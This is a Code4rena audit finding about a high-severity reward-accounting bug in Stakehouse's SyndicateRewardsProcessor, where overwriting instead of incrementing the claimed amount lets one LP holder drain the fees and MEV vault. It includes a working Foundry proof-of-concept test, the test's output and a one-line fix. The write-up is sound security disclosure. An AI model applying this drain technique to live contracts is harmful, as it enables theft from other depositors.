---
tags:
  - lang/solidity
  - sector/farm
  - sector/staking
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/reward-calculation
  - impact/loss-of-funds/direct-drain
  - novelty/variant
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Stakehouse Protocol]]"
auditors:
  - "[[Trust]]"
report: "https://code4rena.com/reports/2022-11-stakehouse"
genome:
  - "[[reward-calculation]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[frontrun-exposure]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# [H-09] Incorrect accounting in `SyndicateRewardsProcessor` results in any LP token holder being able to steal other LP tokens holder's ETH from the fees and MEV vault

- id: 43032
- impact: HIGH
- protocol: [[Stakehouse Protocol]]
- reporter: Trust (Code4rena)
- source: https://code4rena.com/reports/2022-11-stakehouse

## Summary


The bug report discusses an issue in the code for the Stakehouse project. Specifically, there is a problem with the `SyndicateRewardsProcessor` and `StakingFundsVault` contracts. The `SyndicateRewardsProcessor` contract's internal `_distributeETHRewardsToUserForToken()` function is called from the external `claimRewards()` function in the `StakingFundsVault` contract. However, there is a mistake in the code where the `claimed[_user][_token]` value is set equal to the calculated `due` amount, instead of increasing it by that amount. This means that when a user claims their rewards, the first time they will receive the correct amount, but subsequent claims will only reflect the last claimed amount. This allows users to repeatedly claim their rewards until the vault is almost depleted. The report includes a proof of concept test that demonstrates the issue and suggests a modification to the `SyndicateRewardsProcessor` contract to fix the bug. The recommended mitigation step is to modify the `SyndicateRewardsProcessor` contract as suggested in the report.

## Details


<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63><br>
<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88><br>

The SyndicateRewardsProcessor's internal `_distributeETHRewardsToUserForToken()` function is called from external `claimRewards()` function in the `StakingFundsVault` contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.<br>
The accumulated rewards `due` are calculated as `((accumulatedETHPerLPShare * balance) / PRECISION)` reduced by the previous claimed amount stored in `claimed[_user][_token]`. When the ETH is sent to the `_user` the stored value should be increased by the `due` amount. However in the current code base the `claimed[_user][_token]` is set equal to the calculated `due`.

```solidity
function _distributeETHRewardsToUserForToken(
        address _user,
        address _token,
        uint256 _balance,
        address _recipient
    ) internal {
        require(_recipient != address(0), "Zero address");
        uint256 balance = _balance;
        if (balance > 0) {
            // Calculate how much ETH rewards the address is owed / due 
            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
            if (due > 0) {
                claimed[_user][_token] = due;
                totalClaimed += due;
                (bool success, ) = _recipient.call{value: due}("");
				...
			}
        }
    }
```

This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the `claimed[_user][_token]`.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.

### Proof of Concept

Following modification to the existing `StakingFundsVault.t.sol` will provide a test to demonstrate the issue:

```diff
diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol
index 53b4ce0..4db8fc8 100644
--- a/test/foundry/StakingFundsVault.t.sol
+++ b/test/foundry/StakingFundsVault.t.sol
@@ -4,6 +4,7 @@ import "forge-std/console.sol";
 
 import { StakingFundsVault } from "../../contracts/liquid-staking/StakingFundsVault.sol";
 import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";
+import { SyndicateRewardsProcessor} from "../../contracts/liquid-staking/SyndicateRewardsProcessor.sol";
 import {
     TestUtils,
     MockLSDNFactory,
@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {
         assertEq(vault.totalClaimed(), rewardsAmount);
         assertEq(vault.totalRewardsReceived(), rewardsAmount);
     }
+
+    function testRepetitiveClaim() public {
+        // register BLS key with the network
+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);
+
+        vm.label(accountOne, "accountOne");
+        vm.label(accountTwo, "accountTwo");
+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool
+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));
+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));
+
+        // Do a deposit of 24 ETH for savETH pool
+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);
+
+        stakeAndMintDerivativesSingleKey(blsPubKeyFour);
+
+        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);
+
+        vm.warp(block.timestamp + 3 hours);
+
+        // Deal ETH to the staking funds vault
+        uint256 rewardsAmount = 1.2 ether;
+        console.log("depositing %s wei into the vault.\n", rewardsAmount);
+        vm.deal(address(vault), rewardsAmount);
+        assertEq(address(vault).balance, rewardsAmount);
+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);
+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);
+
+        logAccounts();
+
+        console.log("Claiming rewards for accountOne.\n");
+        vm.prank(accountOne);
+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));
+        logAccounts();
+
+        console.log("depositing %s wei into the vault.\n", rewardsAmount);
+        vm.deal(address(vault), address(vault).balance + rewardsAmount);
+        vm.warp(block.timestamp + 3 hours);
+        logAccounts();
+
+        console.log("Claiming rewards for accountOne.\n");
+        vm.prank(accountOne);
+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));
+        logAccounts();
+
+        console.log("Claiming rewards for accountOne AGAIN.\n");
+        vm.prank(accountOne);
+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));
+        logAccounts();
+
+        console.log("Claiming rewards for accountOne AGAIN.\n");
+        vm.prank(accountOne);
+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));
+        logAccounts();
+
+        //console.log("Claiming rewards for accountTwo.\n");
+        vm.prank(accountTwo);
+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));
+
+    }
+
+    function logAccounts() internal {
+        console.log("accountOne previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));
+        console.log("accountOne claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));
+        console.log("accountTwo previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));
+        console.log("accountTwo claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));
+        console.log("ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\n", accountOne.balance, accountTwo.balance, address(vault).balance);
+    }
+
 }

```

Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.

Following is an output of the test script showing the balances and differnet state variables:

```
forge test -vv --match testRepetitiveClaim
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest
[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)
Logs:
  depositing 1200000000000000000 wei into the vault.

  accountOne previewAccumulatedETH : 600000000000000000
  accountOne claimed               : 0
  accountTwo previewAccumulatedETH : 600000000000000000
  accountTwo claimed               : 0
  ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000

  Claiming rewards for accountOne.

  accountOne previewAccumulatedETH : 0
  accountOne claimed               : 600000000000000000
  accountTwo previewAccumulatedETH : 600000000000000000
  accountTwo claimed               : 0
  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000

  depositing 1200000000000000000 wei into the vault.

  accountOne previewAccumulatedETH : 600000000000000000
  accountOne claimed               : 600000000000000000
  accountTwo previewAccumulatedETH : 1200000000000000000
  accountTwo claimed               : 0
  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000

  Claiming rewards for accountOne.

  accountOne previewAccumulatedETH : 600000000000000000
  accountOne claimed               : 600000000000000000
  accountTwo previewAccumulatedETH : 1200000000000000000
  accountTwo claimed               : 0
  ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000

  Claiming rewards for accountOne AGAIN.

  accountOne previewAccumulatedETH : 600000000000000000
  accountOne claimed               : 600000000000000000
  accountTwo previewAccumulatedETH : 1200000000000000000
  accountTwo claimed               : 0
  ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000

  Claiming rewards for accountOne AGAIN.

  accountOne previewAccumulatedETH : 600000000000000000
  accountOne claimed               : 600000000000000000
  accountTwo previewAccumulatedETH : 1200000000000000000
  accountTwo claimed               : 0
  ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0


Test result: FAILED. 0 passed; 1 failed; finished in 15.64ms

Failing tests:
Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest
[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)

Encountered a total of 1 failing tests, 0 tests succeeded

```

### Tools Used

Manual review / forge test

### Recommended Mitigation Steps

The `SyndicateRewardsProcessor` contract should be modified as follows:

```diff
diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol
index 81be706..9b9c502 100644
--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol
+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol
@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {
             // Calculate how much ETH rewards the address is owed / due 
             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
             if (due > 0) {
-                claimed[_user][_token] = due;
+                claimed[_user][_token] += due;
 
                 totalClaimed += due;
 

```

**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147)**



***
